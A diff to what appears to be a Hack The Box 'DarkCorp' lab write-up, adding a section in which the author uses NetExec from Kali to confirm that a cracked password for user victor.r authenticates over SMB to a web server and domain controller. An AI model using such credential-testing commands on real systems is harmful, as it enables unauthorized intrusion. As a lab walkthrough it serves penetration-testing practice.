@@ -672,6 +672,23 @@ The user i found earlier `victor.r` is valid on both hosts, however ebelford is 
 # Initial access on internal network
 
 ```python
+┌──❰kali@kali❱──❰192.168.86.128❱──❰~/htb/darkcorp❱─────────────────────────────────────────────────── 18:19:30
+└──╼ 󰽢 nxc smb web-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' -k
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
+                                                                                                              
+
+┌──❰kali@kali❱──❰192.168.86.128❱──❰~/htb/darkcorp❱─────────────────────────────────────────────────── 18:19:37
+└──╼ 󰽢 nxc smb dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' -k
+SMB         dc-01.darkcorp.htb 445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc-01.darkcorp.htb 445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
+```
+
+The cracked password found earlier gets me initial access on both hosts
+
+## Shares
+
+```python
 
 ```
 
